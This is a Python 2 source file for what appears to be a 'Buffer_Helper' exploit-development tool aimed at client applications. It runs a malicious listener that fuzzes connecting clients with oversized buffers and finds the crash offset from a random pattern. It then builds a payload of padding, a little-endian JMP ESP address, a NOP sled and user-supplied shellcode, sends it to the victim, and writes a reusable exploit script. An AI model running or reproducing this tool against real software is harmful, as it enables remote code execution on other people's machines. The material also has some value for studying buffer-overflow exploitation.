#!/usr/bin/env python 
# -*- coding: utf-8 -*-

import random
import string
import socket 
import time
import readline
from Banner import Banner
import shutil
import fileinput
from subprocess import check_output 
import os
import sys


W='\033[0m'     
R='\033[31m'    
G='\033[0;32m'  
O='\33[37m'     
B='\033[34m'    
P= '\033[35m'   
Y="\033[1;33m" 

class LISTEN_BIND():
        
      def __init__(self): 
            
             global W
             global R
             global G
             global O
             global B
             global P
             global Y 
	     with open('shell_code.py','w') as shell_code:
                 shell_code.write('# pls add your shellcode '+'\n'+'shell_code =()')
             mode = """
                       ========================                          
                           Target Clinet
                       ========================
                               """
             print R+mode+W          
             time.sleep(1)
             self.app_name = str(raw_input(O+"\n[*] "+W+P+"application name : "+W))  
             banner2=Y+'\n\t\tLISTNER OPTIONS'+'\n\t   '+('='*22)+W
             print banner2
             time.sleep(1)
             print O+'\n[*] '+W+O+'Listner Ip = '+W+O+'0.0.0.0'+W
             time.sleep(1)  
             self.listner_port=int(raw_input(O+"\n[+] "+W+B+"Port listner : "+W))  
             self.Fuzzing__()    
             self.string_ramd() 
             self.Listen_FAKE()
             self.connect_client()
             self.option_ret()
             self._hexadecimal()
             self.little_endian()
             self.import_char()             
             self.attack()
             self.auto_write()
      def Fuzzing__(self):     				
          try:                  
                self.Fuz_skip = 's'.lower() 
                self.Fuz_OPt  = "y".lower()  
                time.sleep(2)           
                banner2=Y+'\n\t\tFUZZING OPTIONS'+'\n\t   '+('='*22)
                print banner2
                time.sleep(2) 
                self.Fuzzing_in = str(raw_input(O+"\n[$] "+W+B+"Start Fuzzing Enter " +W+Y+"'Y'" +W+B+ " skip Enter " +W+Y+"'S'"+W+B+' : '+W))               
                if self.Fuzzing_in ==self.Fuz_skip and len(self.Fuzzing_in)==1:
                     pass
                
                elif self.Fuzzing_in ==self.Fuz_OPt and len(self.Fuzzing_in)==1:
                    String = "A"
		    fizzing= ''
                    acount = 100 		    
		    try:
		        Fuzzing_S =  socket.socket(socket.AF_INET,socket.SOCK_STREAM)
                        Fuzzing_S.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
                        Fuzzing_S.bind(('0.0.0.0',self.listner_port))
                        Fuzzing_S.listen(0)
                        print Y+"\n\r\r!---___"+W+R+ "Wating For incoming Connection"+W+Y+'___---!'+W 
                        client,addr = Fuzzing_S.accept()
                        print Y+"\n\r\r!---___"+W+R+"Fizzing Connection Accept From "+W+'%s:'%(addr[0],),P+'___---!'+W 
                        client.settimeout(5)
                        acount  = 100
                        payload = 'A'
                        fizzing  = ''
                        print Y+"\n\r\r!---___"+W+O+ "Fuzzing in process"+W+Y+'___---!\n'+W
                        for i in range(10000):
                              client.send(fizzing+"\n\r") 
                              acount +=100
                              fizzing  = payload*acount 
                              print B+"###--> fizzing Send Byte "+W,acount   
                              sys.stdout.write('\x1b[1A')
                              sys.stdout.write('\x1b[2K')
                              time.sleep(0.30)
		    except:
                          print O+"\n[*] "+W+P+"Fuzzing Stop at " +W+Y+str(acount)+W+ R+ " Bytes"+W 
                          time.sleep(1)
                          Fuzzing_S .close()

                    self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(int(acount))).lower()  
                    self.Random_String = bytearray(self.Random_String)
                    time.sleep(2)
                    banner2=Y+'\n\t\tString Pattern'+'\n\t   '+('='*22)
                    print banner2
                    print Y+"\n\r\r!---___"+W+R+ "String Pattern is Generated in length : "+W,len(self.Random_String)
                    time.sleep(2)  
                    if self.Random_String  > 100: 
                       self.Listen_FAKE()
                       self.connect_client()
                       self.option_ret()
                       self._hexadecimal()
                       self.little_endian()
                       self.import_char()             
                       self.attack()
                       self.auto_write()                                                                                                                    
	        else:         
	           time.sleep(2)    
                   print Y+"\n[-] "+W+R+"please Enter "+W+B+"'Y'"+W+R+"or"+W+B+"'S'"+W+Y+" [-]"+W 
                   return self.Fuzzing__()             
          except KeyboardInterrupt:
                    print  Banner
                    exit()
      def Listen_FAKE(self):
          try:                   
              self.ip_server = "0.0.0.0"
              self.port = self.listner_port          
              self.listen_sock=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
              self.listen_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
              self.listen_sock.bind((self.ip_server,self.port))
              self.listen_sock.listen(1)
              time.sleep(1)
              #self.listen_sock.settimeout(30)
              print Y+"\n\r\r!---___"+W+P+"Buffer_Helper Listen ip "+W+R +" 0.0.0.0 "+W+P+" in port"+W,self.port,Y+"___---!"+W              
              time.sleep(1)
              print Y+"\n\r\r!---___"+W+R+ "Wating For incoming Connection"+W+Y+'___---!'+W 
          except socket.error, exc:               
                time.sleep(1)
                print Y+"\n\r\r!---___"+W+P+ "Socket.Error "+W+O+"%s " %exc+W+Y+'___---!'+W
                time.sleep(1) 
                print Banner      
                exit()
          except KeyboardInterrupt:  
                 print Banner      
                 exit()
      def string_ramd(self):
          
          try:
	      self.Requst_String = int (raw_input(O+"\n[+]"+W+B+"Enter the length of Pattern :"+W))
	      time.sleep(1)
	      self.Random_String = "".join(random.choice(string.ascii_letters)for i in range(self.Requst_String )).lower()  
              self.Random_String = bytearray(self.Random_String)
              print Y+"\n\r\r!---___"+W+R+ "String Pattern is Generated in fizzing  : "+W,len(self.Random_String ) 
	      print
          except Exception:
              time.sleep(1)
              print Y+"\n\r\r!---___"+W+R+ "Check input integer Required"+W+Y+'___---!'+W 
              return self.string_ramd()		 
          except KeyboardInterrupt:
                  print Banner  
                  exit()
      def connect_client(self):       
          try:                
              client , addr =  self.listen_sock.accept()
              print Y+"\n\r\r!---___"+W+R+"BUFFER_HELPER CONNECTION ACCEPT FROM "+W+'%s:'%(addr[0],),P+'___---!'+W  
              client.settimeout(10) 
              while True:                 
                    client.sendall(self.Random_String+'\r\n')                     
          except socket.error, exc:            
                          print Y+"\n\r\r!---___"+W+R+ "Data Send Successful"+W+Y+'___---!'+W                           
                          time.sleep(1)
                          print Y+"\n\r\r!---___"+W+P+ "Buffer OverFlow discover"+W+Y+'___---!'+W 
                          time.sleep(1)
                          try:
                             input= raw_input(O+"\n\t\t!_________application  not repoinding restart then Press any key to Continue________! \n"+W)
                          except NameError:
                               pass	                   
          except KeyboardInterrupt:
                   print Banner
                   exit()
                  
      def option_ret(self):
         
          try:
              continue_1   = "c".lower()            
              return_back  = "b".lower()
              op_sel = str(raw_input(O+"\n[*] "+W+B+"To Continue Press"+W+R+" C "+W+B+"To Return Back  Press "+W+R+"B"+W+B+": "+W)).lower()
              if op_sel== continue_1 and  len(op_sel)==1:
                   pass
              elif op_sel ==return_back and len(op_sel)==1:
                  self.string_ramd()
                  self.Listen_FAKE()
                  self.connect_client()
                  self.option_ret()
              else:
                  print Y+"\n\r\r!---___"+W+R+"Please Enter "+W+B+"C"+W+R+" or "+W+B+"B"+W+Y+'___---!'+W
                  self.option_ret()
          except KeyboardInterrupt:
                   print Banner
                   exit()      
      def _hexadecimal(self):
          banner2=Y+'\n\t\tCRASH ADDRESS'+'\n\t   '+('='*22)+W
          print banner2                                                                         
          while True:
                 try: 
		    self.hexadecimal =str(raw_input(O+"\n[+] "+W+B+"Enter hexadecimal Crash address: "+W)).upper()
                    self.ASCII1 ="".join(reversed([self.hexadecimal[i:i+2] for i in range(0, len(self.hexadecimal), 2)]))                
		    self.ASCII = ''.join(chr(int(self.ASCII1[i:i+2], 16)) for i in range(0, len(self.ASCII1), 2))
		    if  self.ASCII in  self.Random_String and len(self.ASCII)==4:
		       time.sleep(2)
		       print Y+"\n[+] "+W+P+"The ASCII Value  is "+W+B+": "+W,R+self.ASCII+W
		       time.sleep(2)
		       self.location = self.Random_String.find(self.ASCII)		       
		       print Y+"\n[+] "+W+P+"Exact Satch at Offset"+W+B+" : "+W,self.location	              
                       break
		    else:
	               print Y+"\n\r\r!---___"+W+R+ "THE VALUE  OF THE ADDRESS Not FOUND  IN OUR STRING"+W+Y+'___---!'+W
	               time.sleep(2)
	               return self._hexadecimal() 
	                
	         except Exception:
	               print Y+"\n\r\r!---___"+W+R+ "THE VALUE  OF THE ADDRESS Not FOUN"+W+Y+'___---!'+W   
	               return self._hexadecimal()                  
		     
	        
                 except KeyboardInterrupt:
                       print  Banner
                       exit() 
      def import_char(self): 
         try:
            banner2 = Y+'\n\t\tBad_Character'+'\n\t   '+('='*22)+W
            print banner2   
            Bad = "yes".lower()
            Bad_no = "no".lower()                 
            bad_op = str(raw_input(Y+"\n[+] "+W+R+"To Test Bad_Character Enter "+W+B+"yes "+W+R +"To Skip Enter "+W+B+" no : "+W)).lower()
            
            if bad_op == Bad and len(Bad)==3: 
                self.listen_sock.close()
                banner = """  
                    ========================                          
                      Bad_Character start
                    ========================\n 
                      """
                print B+banner+W 
                with open('.data','w')as data :
                    data3 = data.write(str(self.port)+'\n'+str(self.location))          
                time.sleep(2)
                from Bad_Character import Bad_Character_Clinet             
                run = Bad_Character_Clinet()
                from Msf_Helper  import Msf_Helper
                go = Msf_Helper()
            elif bad_op ==Bad_no and len(Bad_no)==2: 
                time.sleep(0.30)
                print Y+"\n\r\r!---___"+W+O+"Default BadCharacter = "+W+P+"'\\x00'"+W+Y+'___---!'+W
                self.badchar ='\\x00'
                ok = 'yes'.lower()
                no = 'no'.lower()
                time.sleep(0.75)
                banner2 = Y+'\n\t\tSCHELLCODE & LISTNER'+'\n\t     '+('='*25)+W
                print banner2
                opt_code = str(raw_input(O+"\n[$] "+W+B+"Generate ShellCode and Listner " +W+Y+"'Yes'" +W+B+ " skip Enter " +W+Y+"'no'"+W+B+' : '+W)).lower()
                if opt_code == ok and len(opt_code)==3 :		              
                    time.sleep(1)                                     
                    try:
                       host_ip   = check_output(['hostname', '--all-ip-addresses']).decode('utf8').replace('\n','')
                       with open('.data','w') as append:
                           append_bad =append.write(self.badchar+'\n'+ host_ip.replace(' ','\n'))  
                    except Exception:
                            host_ip = str(raw_input(O+"\n[%]"+W+B+"Enter Local ip "+W+O+" :"+W))  
                            with open('.data','w') as append:
                                append_bad =append.write(self.badchar+'\n'+ host_ip.replace(' ','\n'))
                    from Msf_Helper  import Msf_Char_NO
                    go = Msf_Char_NO()
                elif opt_code == no and len(opt_code)==2 :                     
                    stop  = str(raw_input(R+"\n\t\t!___To Continue Exploit Generate shellcode and post it in shell_code.py file___! \n"+W ))     
                    pass
            else:
              print Y+"\n[-]"+W+R+"Please Enter "+W+B+"yes"+W+R+" or"+W+B+" no"+W+Y+" [-]"+W 
              self.import_char()                   
         except KeyboardInterrupt:
                print  Banner
                exit()                               
      def little_endian(self):
               banner2=Y+'\n\t\tJMP ESP'+'\n\t   '+('='*22)+W
               print banner2
               try:
                    jump= str(raw_input(O+"\n[+]"+W+B+" Enter JMP ESP addrsss HEX  : "+W)).upper()
                    if len(jump) < 4 :
                        print Y+"\n[(*)]"+W+R+"JMP ESP is Required "+W+Y+"[(*)] "+W  
	                return self.little_endian()  
	            else:
	               pass             
                    time.sleep(2)
                    self.jump_address = "".join(reversed([jump[i:i+2] for i in range(0, len(jump), 2)]))
                    self.display =self.jump_address# for print olnly
                    self.display = " ".join('\\x%s'%self.display[i:i+2] for i in range(0, len(self.display), 2))
                    self.display= self.display.replace(" ", "")
                    time.sleep(2)
                    self.jump_address = ('0'*(len(self.jump_address) % 2) +self.jump_address).decode('hex') 
                    print Y+"\n[+]"+W+P+"little endian JMP ESP  is "+W+B+": "+W,R+self.display+W
               except Exception:
	               print Y+"\n[(*)]"+W+R+"TypeError: Non-hexadecimal digit found "+W+Y+"[(*)] "+W  
	               return self.little_endian()                       
               except KeyboardInterrupt:
                    print  Banner
                    exit()
                              
      def attack(self):
             banner2=Y+'\n\t\tFinal Status'+'\n\t   '+('='*22)+W                                       
             print banner2
             from shell_code import shell_code 
	     try:
	       
                 Start_string = self.location*"A"        
                 self.NO_Operation = len(self.Random_String) - self.location  - len( self.jump_address) 
                 self.NO_Operation = self.NO_Operation*"\x90" 
                 self.count = self.NO_Operation.count("\x90")  
                 attack = Start_string+self.jump_address+ self.NO_Operation +str(shell_code)
                 time.sleep(2) 
                 print Y+'\n[+]'+W+B+'attack'+W+O+' ='+W,len(Start_string),B+'of'+W+R+ " A "+W+O+'+'+W+B+\
                 ' JMP ESP ='+W,Y+self.display+W,O+'+'+W,self.NO_Operation.count("\x90"),B+'of'+W+R+'("\\x90")'+W+O+'+'+W+P+' shellcode'+W
                 time.sleep(2)
                 if len(shell_code) < 50:
                        print P+"\n\t\t\t\t!__________________EXPLOIT__Fail__________________!"+W
                        print B+"\n\t\t\t!__________________Dedicated_No_Shell_Code______________________!"+W
                        exit()
                 else:
                    pass   
                 connect_Attack= self.Listen_FAKE()                                                           
                 client , addr = self.listen_sock.accept()
                 time.sleep(2)
                 print Y+"\n\r\r!---___"+W+R+"BUFFER_HELPER CONNECTION ACCEPT FROM "+W+'%s:'%(addr[0],),P+'___---!'+W
                 client.settimeout(5)
                 while True:
                        try:          
		           client.sendall(attack +'\r\n')
		        		 	       
                        except Exception:
                           print B+"\n[+]"+W+R+"WE READY TO ATTACK !!"+W+B+"[+]"+W 
                           time.sleep(2)
                           print R+"\n\t\t\t!__________________EXPLOIT__SACUSSED__________________!"+W  
			   try :			
			        os.remove('.data')
			        os.remove('.resource')
			    	break
                           except OSError :      
                                break
             except KeyboardInterrupt:
                   Banner  
                   exit()                
      def auto_write(self): 
                from shell_code import shell_code 
                try:                
                  shell =str(shell_code).encode("hex")
                  shell1= "".join("\\x%s"%shell[i:i+2] for i in range(0, len(shell), 2))
                  self.shell_code= "".join('\n"%s"'%shell1[i:i+56] for i in range(0, len(shell1),56))
                  copy_format= shutil.copy("./TemplateExploit/payload2.txt",'./ExploitStore/'+self.app_name+"_Exploit.py")
                  file= './ExploitStore/'+self.app_name+"_Exploit.py"
                  for line in fileinput.FileInput(file,inplace=1):
	                if '# application name :'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+  self.app_name  +'\n')
				 
	                if '_Offset_Byte  =  "A"*'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.location)+'\n')
				 
		        if '_JMP_ESP      ='in line:
		            line = line.rstrip()
		            line = line.replace(line,line+'"'+ self.display+'"'+'\n')
				 
	                if '_NO_OPT       ="\\x90"*'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.count) +'\n')
		        if '_Shell_Code   = ('in line:
		             line = line.rstrip()
		             line = line.replace(line,line+ self.shell_code+ ')'+'\n')	
                       
                        if 'connect_Port = 'in line:
		            line = line.rstrip()
		            line = line.replace(line,line+ str(self.port)+'\n')  		     
				
		        print line,
		  time.sleep(2)
		  print O+"\n\t!_________The Final Process of this Exploit Written in to "+W,Y+"'ExploitStore'"+W,O+"Folder________!"+W
		  time.sleep(2)     
                  print   Banner
                  exit() 
                except KeyboardInterrupt:    
                     print   Banner                              	
                     exit()
                       
if __name__ == '__main__': 
  LISTEN_BIND()
